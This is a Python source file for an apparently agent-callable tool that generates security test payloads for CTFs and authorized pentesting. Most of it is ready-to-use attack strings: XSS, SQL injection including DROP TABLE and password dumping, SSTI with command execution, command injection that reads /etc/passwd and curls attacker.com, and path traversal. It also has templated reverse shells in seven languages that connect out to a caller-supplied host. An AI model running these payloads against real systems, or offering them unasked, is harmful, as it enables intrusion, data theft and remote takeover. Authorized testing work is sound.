"""PayloadGenTool — generate CTF test payloads (XSS, SQLi, SSTI, etc.)."""
from __future__ import annotations

from pathlib import Path
from typing import Any

from .base import Tool, ToolResult

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    '{{7*7}}',
    '${7*7}',
    '<details open ontoggle=alert(1)>',
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    'javascript:alert(1)//',
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "1' ORDER BY 1 --",
    "1' ORDER BY 10 --",
    "admin' --",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "1; DROP TABLE users --",
    "' OR 1=1 #",
    "1' AND SLEEP(5) --",
    "' UNION SELECT username, password FROM users --",
]

SSTI_PAYLOADS = [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '{{config}}',
    '{{self.__class__.__mro__}}',
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    '${T(java.lang.Runtime).getRuntime().exec("id")}',
    '{{request.application.__globals__.__builtins__}}',
]

CMDINJECTION_PAYLOADS = [
    '; id', '| id', '`id`', '$(id)',
    '; cat /etc/passwd', '| cat /etc/passwd',
    '& whoami', '&& whoami',
    '; ping -c 1 127.0.0.1',
    '| curl http://attacker.com',
]

PATH_TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '/etc/passwd%00.png',
]

REVERSE_SHELLS = {
    "bash": 'bash -i >& /dev/tcp/{host}/{port} 0>&1',
    "python": 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    "nc": 'nc -e /bin/sh {host} {port}',
    "nc_mkfifo": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f',
    "powershell": 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
    "php": 'php -r \'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    "ruby": 'ruby -rsocket -e \'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    "perl": 'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
}


class PayloadGenTool(Tool):
    name = "payload_gen"
    description = (
        "Generate security test payloads for CTF challenges and authorized pentesting. "
        "Types: 'xss', 'sqli', 'ssti', 'cmdi', 'path_traversal', 'reverse_shell'."
    )
    dangerous = True
    input_schema = {
        "type": "object",
        "properties": {
            "type": {
                "type": "string",
                "description": "Payload type: 'xss', 'sqli', 'ssti', 'cmdi', 'path_traversal', 'reverse_shell'.",
                "enum": ["xss", "sqli", "ssti", "cmdi", "path_traversal", "reverse_shell"],
            },
            "host": {
                "type": "string",
                "description": "Attacker IP for reverse shells (default 127.0.0.1).",
                "default": "127.0.0.1",
            },
            "port": {
                "type": "integer",
                "description": "Port for reverse shells (default 4444).",
                "default": 4444,
            },
            "shell_type": {
                "type": "string",
                "description": "Shell language for reverse_shell (bash, python, nc, powershell, php, ruby, perl).",
                "default": "bash",
            },
        },
        "required": ["type"],
    }

    def execute(self, workspace: Path, **kwargs: Any) -> ToolResult:
        payload_type = kwargs.get("type", "")
        host = kwargs.get("host", "127.0.0.1")
        port = int(kwargs.get("port", 4444))
        shell_type = kwargs.get("shell_type", "bash")

        payloads = {
            "xss": XSS_PAYLOADS,
            "sqli": SQLI_PAYLOADS,
            "ssti": SSTI_PAYLOADS,
            "cmdi": CMDINJECTION_PAYLOADS,
            "path_traversal": PATH_TRAVERSAL_PAYLOADS,
        }

        if payload_type == "reverse_shell":
            if shell_type == "all":
                lines = []
                for name, template in REVERSE_SHELLS.items():
                    lines.append(f"=== {name} ===")
                    lines.append(template.format(host=host, port=port))
                    lines.append("")
                return ToolResult.ok("\n".join(lines))
            template = REVERSE_SHELLS.get(shell_type)
            if not template:
                return ToolResult.fail(f"Unknown shell: {shell_type}. Available: {', '.join(REVERSE_SHELLS)}")
            return ToolResult.ok(template.format(host=host, port=port))

        if payload_type in payloads:
            items = payloads[payload_type]
            numbered = [f"{i+1:2d}. {p}" for i, p in enumerate(items)]
            return ToolResult.ok(f"{payload_type.upper()} payloads ({len(items)}):\n" + "\n".join(numbered))

        return ToolResult.fail(f"Unknown type: {payload_type}")
